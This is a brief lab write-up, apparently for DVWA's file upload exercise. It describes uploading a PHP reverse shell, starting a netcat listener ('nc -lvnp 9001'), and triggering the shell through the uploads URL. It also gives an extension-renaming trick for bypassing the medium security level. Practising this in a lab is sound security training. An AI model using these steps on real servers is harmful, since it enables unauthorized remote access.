Security level is currently: low.

php reverse shell code: Downloaded from github

Listing IP: 192.168.170.131 port: 9001

netcat listener command: nc -lvnp 9001

upload the file rev.php and visit the url : http://192.168.170.131/hackable/uploads/rev.php

and you have reverse shell:

![Screenshot 2025-04-25 032053](https://github.com/user-attachments/assets/fc5701af-ac70-40ff-ad23-4eae7ecde73a)


In the the medium section we can do the similar but we have to just edit the rev.php to rev.php.jpej so that it can easily bypass.
